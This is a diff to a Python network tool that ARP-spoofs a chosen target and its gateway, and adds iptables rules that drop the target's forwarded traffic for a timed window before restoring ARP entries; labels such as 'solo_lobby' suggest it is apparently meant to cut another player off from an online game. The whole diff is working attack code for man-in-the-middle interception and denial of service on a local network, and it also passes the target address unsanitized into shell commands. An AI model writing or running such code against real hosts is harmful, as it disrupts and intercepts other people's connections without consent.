@@ -165,8 +165,13 @@ def timed_intercept_logic(target_ip, gateway_ip, duration_ms):
             print(f"[!] GHOST FAIL: Could not resolve MAC for {target_ip} or {gateway_ip}")
             return
         
+        print(f"[+] GHOST START: Cutting {target_ip} for {duration_ms}ms")
+        
+        # On Linux hosts, we must DROP the traffic via iptables because the host might forward it.
+        os.system(f"iptables -I FORWARD 1 -s {target_ip} -j DROP")
+        os.system(f"iptables -I FORWARD 1 -d {target_ip} -j DROP")
+        
         stop_event = threading.Event()
-        # Pass MACs directly to avoid re-resolving in the thread
         threading.Thread(target=spoof_loop_with_macs, args=(target_ip, target_mac, gateway_ip, gateway_mac, stop_event), daemon=True).start()
         
         while time.time() < state["solo_lobby_expires"]:
@@ -174,12 +179,19 @@ def timed_intercept_logic(target_ip, gateway_ip, duration_ms):
             
         stop_event.set()
         
-        print(f"[+] GHOST SUCCESS: Restoring ARP for {target_ip}")
+        # Restore traffic
+        os.system(f"iptables -D FORWARD -s {target_ip} -j DROP")
+        os.system(f"iptables -D FORWARD -d {target_ip} -j DROP")
+        
+        print(f"[+] GHOST FINISH: Restoring ARP for {target_ip}")
         sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), iface=state["iface"], count=3, verbose=0)
         sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), iface=state["iface"], count=3, verbose=0)
             
     except Exception as e:
         print(f"[!] Timed cut error: {e}")
+        # Ensure rules are cleaned up on error
+        os.system(f"iptables -D FORWARD -s {target_ip} -j DROP > /dev/null 2>&1")
+        os.system(f"iptables -D FORWARD -d {target_ip} -j DROP > /dev/null 2>&1")
     finally:
         state["solo_lobby_active"] = False
         state["solo_lobby_expires"] = 0
